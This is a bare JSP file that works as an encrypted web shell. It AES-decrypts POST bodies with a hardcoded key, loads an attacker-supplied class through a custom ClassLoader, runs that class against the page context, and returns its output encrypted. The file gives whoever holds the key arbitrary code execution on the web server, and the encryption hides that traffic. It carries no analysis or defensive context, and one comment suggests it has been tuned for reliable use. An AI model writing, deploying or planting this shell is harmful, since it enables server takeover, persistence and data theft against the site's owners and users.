<%@page import="javax.crypto.Cipher,javax.crypto.spec.SecretKeySpec"%><%!
class MX extends ClassLoader {
    MX(ClassLoader p) { super(p); }
    Class g(byte[] b) { return super.defineClass(b, 0, b.length); }
}
%><%
String xc = "3c6e0b8a9c15224a";
if (request.getMethod().equals("POST")) {
    int len = request.getContentLength();
    if (len <= 0) {
        try {
            len = Integer.parseInt(request.getHeader("Content-Length").trim());
        } catch (Exception ignore) {
            len = 0;
        }
    }
    byte[] data = new byte[len];
    int off = 0;
    while (off < len) {
        int n = request.getInputStream().read(data, off, len - off);
        if (n <= 0) break;
        off += n;
    }
    Cipher c = Cipher.getInstance("AES");
    c.init(2, new SecretKeySpec(xc.getBytes(), "AES"));
    data = c.doFinal(data);
    if (session.getAttribute("payload") == null) {
        session.setAttribute("payload", new MX(this.getClass().getClassLoader()).g(data));
    } else {
        request.setAttribute("parameters", data);
        java.io.ByteArrayOutputStream mxOut = new java.io.ByteArrayOutputStream();
        Object f = ((Class) session.getAttribute("payload")).newInstance();
        f.equals(mxOut);
        f.equals(pageContext);
        f.toString();
        Cipher e = Cipher.getInstance("AES");
        e.init(1, new SecretKeySpec(xc.getBytes(), "AES"));
        // 裸二进制响应：先释放 JSP 隐式 writer，避免页面结束时
        // "getOutputStream() has already been called for this response"。
        out.clear();
        out = pageContext.pushBody();
        response.getOutputStream().write(e.doFinal(mxOut.toByteArray()));
        response.getOutputStream().flush();
    }
}
%>
